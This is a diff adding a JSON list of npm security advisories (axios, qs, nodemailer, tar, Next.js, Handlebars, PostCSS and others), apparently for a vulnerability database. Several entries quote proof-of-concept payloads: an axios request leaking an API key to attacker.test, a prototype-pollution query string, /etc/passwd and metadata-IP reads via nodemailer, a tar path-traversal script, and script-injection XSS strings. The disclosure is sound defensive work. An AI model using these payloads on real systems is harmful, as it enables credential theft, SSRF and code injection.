+  "published": "2026-06-15T17:26:26Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12143",
+  "fixed": [
+   "form-data@2.5.6",
+   "form-data@3.0.5",
+   "form-data@4.0.6"
+  ]
+ },
+ {
+  "id": "GHSA-hrpp-h998-j3pp",
+  "summary": "qs vulnerable to Prototype Pollution",
+  "details": "qs before 6.10.3 allows attackers to cause a Node process hang because an `__ proto__` key can be used. In many typical web framework use cases, an unauthenticated remote attacker can place the attack payload in the query string of the URL that is used to visit the application, such as `a[__proto__]=b&a[__proto__]&a[length]=100000000`. The fix was backported to qs 6.9.7, 6.8.3, 6.7.3, 6.6.1, 6.5.3, 6.4.1, 6.3.3, and 6.2.4.",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2022-24999"
+  ],
+  "published": "2022-11-27T00:30:50Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24999",
+  "fixed": [
+   "qs@6.10.3",
+   "qs@6.9.7",
+   "qs@6.8.3",
+   "qs@6.7.3",
+   "qs@6.6.1",
+   "qs@6.5.3",
+   "qs@6.4.1",
+   "qs@6.3.3",
+   "qs@6.2.4"
+  ]
+ },
+ {
+  "id": "GHSA-hwqf-gcqm-7353",
+  "summary": "Header injection in nodemailer",
+  "details": "The package nodemailer before 6.6.1 are vulnerable to HTTP Header Injection if unsanitized user input that may contain newlines and carriage returns is passed into an address object.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2021-23400"
+  ],
+  "published": "2021-12-10T18:56:57Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23400",
+  "fixed": [
+   "nodemailer@6.6.1"
+  ]
+ },
+ {
+  "id": "GHSA-j5f8-grm9-p9fc",
+  "summary": "Axios: Proxy-Authorization header leaks to redirect target when proxy is re-evaluated to direct connection",
+  "details": "### Summary\n\nAxios’ Node.js HTTP adapter can leak proxy credentials to a redirect target in affected versions. When a request is sent through an authenticated proxy, Axios may add a `Proxy-Authorization` header. If Axios then follows a redirect and the redirected request is no longer sent through that proxy, the stale `Proxy-Authorization` header can remain on the redirected request and be sent to the redirect target.\n\nThis affects Node.js's use of Axios with automatic redirects enabled and an authenticated proxy configuration. Browser adapters are not affected.\n\n### Impact\n\nAn attacker who controls a server that the victim application requests can redirect the request so that the attacker-controlled redirect target receives the victim’s proxy credentials.\n\nThe most relevant case is a Node.js application using an authenticated `HTTP_PROXY` for an initial `http://` request, with redirects enabled, where the redirect target resolves to no proxy, such as an `https://` URL when `HTTPS_PROXY` is unset.\n\nThis does not affect browser, XHR, or fetch adapter behaviour. It also does not affect requests with `maxRedirects: 0`.\n\n### Affected Functionality\n\nAffected functionality is limited to ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-44486"
+  ],
+  "published": "2026-06-04T14:15:01Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44486",
+  "fixed": [
+   "axios@1.16.0",
+   "axios@0.32.0"
+  ]
+ },
+ {
+  "id": "GHSA-jr5f-v2jv-69x6",
+  "summary": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
+  "details": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2025-27152"
+  ],
+  "published": "2025-03-07T15:16:00Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-27152",
+  "fixed": [
+   "axios@1.8.2",
+   "axios@0.30.0"
+  ]
+ },
+ {
+  "id": "GHSA-m6fv-jmcg-4jfg",
+  "summary": "send vulnerable to template injection that can lead to XSS",
+  "details": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2024-43799"
+  ],
+  "published": "2024-09-10T19:42:41Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43799",
+  "fixed": [
+   "send@0.19.0"
+  ]
+ },
+ {
+  "id": "GHSA-m7pr-hjqh-92cm",
+  "summary": "Axios: no_proxy bypass via IP alias allows SSRF",
+  "details": "The fix for no_proxy hostname normalization bypass (#10661) is incomplete.When no_proxy=localhost is set, requests to 127.0.0.1 and [::1] still route through the proxy instead of bypassing it.\n\nThe shouldBypassProxy() function does pure string matching — it does not \nresolve IP aliases or loopback equivalents. As a result:\n- no_proxy=localhost does NOT block 127.0.0.1 or [::1]\n- no_proxy=127.0.0.1 does NOT block localhost or [::1]\n\n\nPOC :\nprocess.env.no_proxy = 'localhost';\nprocess.env.http_proxy = 'http://attacker-proxy:8888';\n\n```(base) srisowmyanemani@Srisowmyas-MacBook-Pro axios % >....                     \n    process.env.http_proxy = 'http://127.0.0.1:8888';\n\n    console.log('=== Test 1: localhost (should bypass proxy) ===');\n    try {\n      await axios.get('http://localhost:7777/');\n    } catch(e) {\n      console.log('Error:', e.message);\n    }\n\n    console.log('');\n    console.log('=== Test 2: 127.0.0.1 (should ALSO bypass proxy but DOES NOT) ===');\n    try {\n      await axios.get('http://127.0.0.1:7777/');\n    } catch(e) {\n      console.log('Error:', e.message);\n    }\n\n    fakeProxy.close();\n    internalServer.close();\n  });\n});\nEOF\n=== Test 1: localhost (should bypass pro",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-42038"
+  ],
+  "published": "2026-05-05T00:40:17Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42038",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-mh6f-8j2x-4483",
+  "summary": "Critical severity vulnerability that affects event-stream and flatmap-stream",
+  "details": "The NPM package `flatmap-stream` is considered malicious.  A malicious actor added this package as a dependency to the NPM `event-stream` package in version `3.3.6`.  Users of `event-stream` are encouraged to downgrade to the last non-malicious version, `3.3.4`, or upgrade to the latest  4.x version. \n\nUsers of `flatmap-stream` are encouraged to remove the dependency entirely.\n",
+  "severity": "CRITICAL",
+  "aliases": [],
+  "published": "2018-11-26T23:58:21Z",
+  "url": "https://github.com/advisories/GHSA-mh6f-8j2x-4483",
+  "fixed": [
+   "event-stream@4.0.0"
+  ]
+ },
+ {
+  "id": "GHSA-mm7p-fcc7-pg87",
+  "summary": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
+  "details": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  consol",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2025-13033"
+  ],
+  "published": "2025-10-07T13:42:02Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-13033",
+  "fixed": [
+   "nodemailer@7.0.7"
+  ]
+ },
+ {
+  "id": "GHSA-mmx7-hfxf-jppx",
+  "summary": "Axios: Prototype pollution gadgets can alter axios request construction",
+  "details": "## Summary\n\naxios is vulnerable to read-side prototype-pollution gadgets when `Object.prototype` has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: `axios.get()`, `axios.delete()`, `axios.head()`, and `axios.options()` read inherited `data` before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.\n\nAdditional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited `proxy` or `paramsSerializer` values can influence request routing or URL serialization. These low-level paths are not reproduced through normal `axios.get()` usage on `1.15.2+`.\n\n## Impact\n\nAn attacker who can first pollute `Object.prototype` can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on `GET`, `DELETE`, `HEAD`, or `OPTIONS`.\n\nFor direct low-level Node HTTP adapter usage, inherited `proxy` can route requests through an attacker-controlled proxy. Depending on axios version, targ",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-67316"
+  ],
+  "published": "2026-07-20T22:25:07Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-67316",
+  "fixed": [
+   "axios@1.18.0",
+   "axios@0.33.0"
+  ]
+ },
+ {
+  "id": "GHSA-p6gq-j5cr-w38f",
+  "summary": "Nodemailer: Message-level raw option bypasses disableFileAccess/disableUrlAccess, enabling arbitrary file read and full-response SSRF in the delivered message",
+  "details": "# Message-level `raw` option bypasses `disableFileAccess` / `disableUrlAccess`, enabling arbitrary file read and full-response SSRF in the sent message\n\n- **Target:** nodemailer/nodemailer, npm `nodemailer` **v9.0.0** (HEAD `4e58450eb490e5097a74b2b2cce35a8d9e21856e`)\n- **Verdict:** CONFIRMED (local PoC, no network)\n\n## Summary\n\nNodemailer exposes `disableFileAccess` and `disableUrlAccess` so an application that passes\n**untrusted** message data to the library can forbid that data from reading local files or\nfetching URLs. Every attachment, alternative, `html`/`text`/`watchHtml`/`amp` and `icalEvent`\ncontent node honors these flags. **The message-level `raw` option does not.**\n\n`MailComposer.compile()` builds the root MIME node for a `raw` message **without** threading the\ntwo flags, so a `raw: { path: '/etc/passwd' }` or `raw: { href: 'http://169.254.169.254/…' }`\nmessage is read / fetched anyway, and the file or HTTP-response bytes become the **actual\nmessage that is sent** by every transport (SMTP, SES, sendmail, stream, JSON). An actor whose\ninput the application intended to sandbox therefore obtains arbitrary local-file disclosure and\na full-response SSRF primitive, delivered t",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-82659"
+  ],
+  "published": "2026-06-18T14:28:05Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82659",
+  "fixed": [
+   "nodemailer@9.0.1"
+  ]
+ },
+ {
+  "id": "GHSA-p6mc-m468-83gw",
+  "summary": "Prototype Pollution in lodash",
+  "details": "Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The functions `pick`, `set`, `setWith`, `update`, `updateWith`, and `zipObjectDeep` allow a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires manipulating objects based on user-provided property values or arrays.\n\nThis vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2020-8203"
+  ],
+  "published": "2020-07-15T19:15:48Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8203",
+  "fixed": [
+   "lodash@4.17.19",
+   "lodash-es@4.17.20",
+   "lodash-rails@4.17.19"
+  ]
+ },
+ {
+  "id": "GHSA-p8p7-x288-28g6",
+  "summary": "Server-Side Request Forgery in Request",
+  "details": "The `request` package through 2.88.2 for Node.js and the `@cypress/request` package prior to 3.0.0 allow a bypass of SSRF mitigations via an attacker-controller server that does a cross-protocol redirect (HTTP to HTTPS, or HTTPS to HTTP).\n\nNOTE: The `request` package is no longer supported by the maintainer.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2023-28155"
+  ],
+  "published": "2023-03-16T15:30:19Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28155",
+  "fixed": [
+   "@cypress/request@3.0.0"
+  ]
+ },
+ {
+  "id": "GHSA-p8wg-vrv2-v86f",
+  "summary": "Handlebars: JavaScript Injection via Own Property Check Bypass",
+  "details": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requi",
+  "severity": "CRITICAL",
+  "aliases": [
+   "CVE-2026-106445"
+  ],
+  "published": "2026-10-08T17:52:26Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106445",
+  "fixed": [
+   "handlebars@4.7.10"
+  ]
+ },
+ {
+  "id": "GHSA-p92q-9vqr-4j8v",
+  "summary": "Axios: Proxy-Authorization Credential Leak to Origin Server Across HTTP-to-HTTPS Redirect in Axios Node.js HTTP Adapter",
+  "details": "## Summary\n\nAxios’s Node.js HTTP adapter may forward a `Proxy-Authorization` header to a redirected origin during specific proxy-to-direct redirect flows.\n\nThis affects Node.js usage, where an initial HTTP request is sent through an authenticated HTTP proxy, redirects are followed, and the redirected URL is no longer proxied. Under affected redirect shapes, the final origin can receive the proxy credential that was intended only for the outbound proxy.\n\n## Impact\n\nA malicious or attacker-controlled origin can cause an axios client to disclose its configured proxy credentials if all required conditions are present.\n\nThe leak is limited to Node.js HTTP adapter requests. Browser, XHR, fetch, and React Native adapter paths are not affected by this Node-specific proxy handling path.\n\nThe practical impact depends on the leaked credentials. If the credential is reusable and the proxy is reachable by the attacker, the attacker may be able to authenticate to that proxy, subject to the proxy’s own network exposure, authorisation policy, and credential scope.\n\n## Affected Functionality\n\nAffected functionality requires all of the following:\n\n- Axios running in Node.js with the HTTP adapter.\n- ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-44487"
+  ],
+  "published": "2026-06-04T14:19:53Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44487",
+  "fixed": [
+   "axios@1.16.0",
+   "axios@0.32.0"
+  ]
+ },
+ {
+  "id": "GHSA-p9j2-gv94-2wf4",
+  "summary": "Next.js: Server-Side Request Forgery in rewrites via attacker-controlled destination hostname",
+  "details": "## Impact\n\nA `rewrites()` or `redirects()` rule that builds its external destination hostname from request-controlled input can be pointed at an arbitrary hostname, regardless of the rule's hostname suffix. For a rewrite, Next.js proxies the request to that arbitrary host and serves the response from the application's origin, leading to Server-Side Request forgery. A `redirects()` rule configured this way is vulnerable to an Open Redirect.\n\nThis affects any destination that puts a dynamic segment in the hostname, whether from the path:\n\n```javascript\n// next.config.js\nmodule.exports = {\n  async rewrites() {\n    return [\n      {\n        source: '/:tenant',\n        destination: 'https://:tenant.api.example.com',\n      },\n    ]\n  },\n}\n```\n\nor from a `has` capture:\n\n```javascript\n// next.config.js\nmodule.exports = {\n  async rewrites() {\n    return [\n      {\n        source: '/',\n        has: [{ type: 'query', key: 'region', value: '(?<region>.+)' }],\n        destination: 'https://:region.api.example.com',\n      },\n    ]\n  },\n}\n```\n\n## Workarounds\n\nIf you cannot upgrade immediately, do not build the hostname of an external `rewrites()` or `redirects()` destination from user-controlled in",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-64645"
+  ],
+  "published": "2026-07-22T23:02:23Z",
+  "url": "https://osv.dev/vulnerability/GHSA-p9j2-gv94-2wf4",
+  "fixed": [
+   "next@15.5.21",
+   "next@16.2.11"
+  ]
+ },
+ {
+  "id": "GHSA-pf86-5x62-jrwf",
+  "summary": "Axios: Prototype Pollution Gadgets - Response Tampering, Data Exfiltration, and Request Hijacking",
+  "details": "## Summary\n\nWhen `Object.prototype` has been polluted by any co-dependency with keys that axios reads without a `hasOwnProperty` guard, an attacker can (a) silently intercept and modify every JSON response before the application sees it, or (b) fully hijack the underlying HTTP transport, gaining access to request credentials, headers, and body. The precondition is prototype pollution from a separate source in the same process -- lodash < 4.17.21, or any of several other common npm packages with known PP vectors. The two gadgets confirmed here work independently.\n\n---\n\n## Background: how mergeConfig builds the config object\n\nEvery axios request goes through `Axios._request` in [`lib/core/Axios.js#L76`](https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L76):\n\n```js\nconfig = mergeConfig(this.defaults, config);\n```\n\nInside `mergeConfig`, the merged config is built as a plain `{}` object ([`lib/core/mergeConfig.js#L20`](https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L20)):\n\n```js\nconst config = {};\n```\n\nA plain `{}` inherits from `Object.prototype`. `mergeConfig` only iterates `Object.keys({ ...config1, ...config2 })` ([line 99](https://github.com/axios/",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-42033"
+  ],
+  "published": "2026-05-05T00:26:29Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42033",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-pjwm-pj3p-43mv",
+  "summary": "axios's shouldBypassProxy does not recognize IPv4-mapped IPv6 addresses, allowing NO_PROXY bypass (incomplete fix for CVE-2025-62718)",
+  "details": "### Summary\nshouldBypassProxy, introduced in v1.15.0 to fix CVE-2025-62718, does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as `127.0.0.1` or `169.254.169.254`, a request URL using the IPv4-mapped IPv6 form (`::ffff:7f00:1`, `::ffff:a9fe:a9fe`) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked.\n\n### Details\nlib/helpers/shouldBypassProxy.js (v1.15.0):                                                                                                                                   \n\n```javascript                                                                                                                                                                              \n  const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);                                                                                                      \n  const isLoopback = (host) => LOOPBACK_ADDRESSES.has(host);                                                                                                                 ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-44492"
+  ],
+  "published": "2026-05-29T15:59:30Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44492",
+  "fixed": [
+   "axios@1.16.0",
+   "axios@0.32.0"
+  ]
+ },
+ {
+  "id": "GHSA-pmwg-cvhr-8vh7",
+  "summary": "Axios: Incomplete Fix for CVE-2025-62718 — NO_PROXY Protection Bypassed via RFC 1122 Loopback Subnet (127.0.0.0/8) in Axios 1.15.0",
+  "details": "**1. Executive Summary**\nThis report documents an **incomplete security patch** for the previously disclosed vulnerability **GHSA-3p68-rc4w-qgx5 (CVE-2025-62718)**, which affects the `NO_PROXY` hostname resolution logic in the Axios HTTP library.\n\n**Background — The Original Vulnerability**\nThe original vulnerability (GHSA-3p68-rc4w-qgx5) disclosed that Axios did not normalize hostnames before comparing them against `NO_PROXY` rules. Specifically, a request to `http://localhost./` (with a trailing dot) or `http://[::1]/` (with IPv6 bracket notation) would **bypass NO_PROXY matching entirely** and be forwarded to the configured HTTP proxy — even when `NO_PROXY=localhost,127.0.0.1,::1` was explicitly set by the developer to protect loopback services.\n\nThe Axios maintainers addressed this in **version 1.15.0** by introducing a `normalizeNoProxyHost()` function in `lib/helpers/shouldBypassProxy.js`, which strips trailing dots from hostnames and removes brackets from IPv6 literals before performing the NO_PROXY comparison.\n\n**The Incomplete Patch — This Finding**\nWhile the patch correctly addresses the specific cases reported (trailing dot normalization and IPv6 bracket removal), **the ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-42043"
+  ],
+  "published": "2026-05-05T00:20:58Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42043",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-pxg6-pf52-xh8x",
+  "summary": "cookie accepts cookie name, path, and domain with out of bounds characters",
+  "details": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2024-47764"
+  ],
+  "published": "2024-10-04T20:31:00Z",
+  "url": "https://osv.dev/vulnerability/GHSA-pxg6-pf52-xh8x",
+  "fixed": [
+   "cookie@0.7.0"
+  ]
+ },
+ {
+  "id": "GHSA-qffp-2rhf-9h96",
+  "summary": "tar has Hardlink Path Traversal via Drive-Relative Linkpath",
+  "details": "### Summary\n`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.\n\nWhat happens with `linkpath: \"C:../target.txt\"`:\n1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.\n2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.\n3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.\n4. Writing through the extracted hardlink overwrites the outside file.\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.9`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(process.cwd(), 'poc.tar')\n\nfs.writeFileSync(target, 'ORIG",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-29786"
+  ],
+  "published": "2026-03-05T00:52:32Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-29786",
+  "fixed": [
+   "tar@7.5.10"
+  ]
+ },
+ {
+  "id": "GHSA-qpjv-v59x-3qc4",
+  "summary": "Next.js Race Condition to Cache Poisoning",
+  "details": "**Summary**  \nWe received a responsible disclosure from Allam Rachid (zhero) for a low-severity race-condition vulnerability in Next.js. This issue only affects the **Pages Router** under certain misconfigurations, causing normal endpoints to serve `pageProps` data instead of standard HTML.\n\n[Learn more here](https://vercel.com/changelog/cve-2025-32421)\n\n**Credit**  \nThank you to **Allam Rachid (zhero)** for the responsible disclosure. This research was rewarded as part of our bug bounty program.",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2025-32421"
+  ],
+  "published": "2025-05-15T14:12:26Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-32421",
+  "fixed": [
+   "next@14.2.24",
+   "next@15.1.6"
+  ]
+ },
+ {
+  "id": "GHSA-qq89-hq3f-393p",
+  "summary": "Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning using symbolic links",
+  "details": "### Impact\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\nnode-tar aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained two directories and a symlink with names containing unicode values that normalized to the same value. Additionally, on Windows systems, long path portions would resolve to the same file system entities as their 8.3 \"short path\" counterparts. A specially crafted tar archive could thus include directories with two forms of the path that resolve to the same file system entity, followed by a symbolic link with a name in the first form, lastly followed by a file using the second form. It led to bypassing node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thu",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2021-37712"
+  ],
+  "published": "2021-08-31T16:05:17Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-37712",
+  "fixed": [
+   "tar@4.4.18",
+   "tar@5.0.10",
+   "tar@6.1.9"
+  ]
+ },
+ {
+  "id": "GHSA-qw6h-vgh9-j6wx",
+  "summary": "express vulnerable to XSS via response.redirect()",
+  "details": "### Impact\n\nIn express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in express 4.20.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2024-43796"
+  ],
+  "published": "2024-09-10T19:41:04Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43796",
+  "fixed": [
+   "express@4.20.0",
+   "express@5.0.0"
+  ]
+ },
+ {
+  "id": "GHSA-qwcr-r2fm-qrc7",
+  "summary": "body-parser vulnerable to denial of service when url encoding is enabled",
+  "details": "### Impact\n\nbody-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.\n\n### Patches\n\nthis issue is patched in 1.20.3\n\n### References\n",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2024-45590"
+  ],
+  "published": "2024-09-10T15:52:39Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45590",
+  "fixed": [
+   "body-parser@1.20.3"
+  ]
+ },
+ {
+  "id": "GHSA-qwph-4952-7xr6",
+  "summary": "jsonwebtoken vulnerable to signature validation bypass due to insecure default algorithm in jwt.verify()",
+  "details": "# Overview\n\nIn versions <=8.5.1 of jsonwebtoken library, lack of algorithm definition and a falsy secret or key in the `jwt.verify()` function can lead to signature validation bypass due to defaulting to the `none` algorithm for signature verification.\n\n# Am I affected?\nYou will be affected if all the following are true in the `jwt.verify()` function:\n- a token with no signature is received\n- no algorithms are specified \n- a falsy (e.g. null, false, undefined) secret or key is passed \n\n# How do I fix it?\n \nUpdate to version 9.0.0 which removes the default support for the none algorithm in the `jwt.verify()` method. \n\n# Will the fix impact my users?\n\nThere will be no impact, if you update to version 9.0.0 and you don’t need to allow for the `none` algorithm. If you need 'none' algorithm, you have to explicitly specify that in `jwt.verify()` options.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2022-23540"
+  ],
+  "published": "2022-12-22T03:32:59Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23540",
+  "fixed": [
+   "jsonwebtoken@9.0.0"
+  ]
+ },
+ {
+  "id": "GHSA-qx2v-qp2m-jg93",
+  "summary": "PostCSS has XSS via Unescaped </style> in its CSS Stringify Output",
+  "details": "# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output\n\n## Summary\n\nPostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.\n\n## Proof of Concept\n\n```javascript\nconst postcss = require('postcss');\n\n// Parse user CSS and re-stringify for page embedding\nconst userCSS = 'body { content: \"</style><script>alert(1)</script><style>\"; }';\nconst ast = postcss.parse(userCSS);\nconst output = ast.toResult().css;\nconst html = `<style>${output}</style>`;\n\nconsole.log(html);\n// <style>body { content: \"</style><script>alert(1)</script><style>\"; }</style>\n//\n// Browser: </style> closes the style tag, <script> executes\n```\n\n**Tested output** (Node.js v22, postcss v8.5.5):\n```\nInput: body { content: \"</style><script>alert(1)</script><style>\"; }\nOutput: body { content: \"</style><script>alert(1)</script><style>\"; 